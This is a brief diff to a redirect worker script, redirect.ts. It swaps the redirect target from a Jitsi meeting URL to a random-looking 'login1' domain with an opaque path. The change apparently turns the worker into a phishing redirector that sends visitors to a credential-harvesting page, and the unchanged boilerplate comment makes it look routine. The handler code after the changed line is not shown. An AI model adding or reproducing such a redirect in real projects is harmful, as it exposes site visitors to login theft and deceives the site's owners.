@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://meet.jitsi.online/"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://login1.xxlshetvtvss1.com/srgvRsfn"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
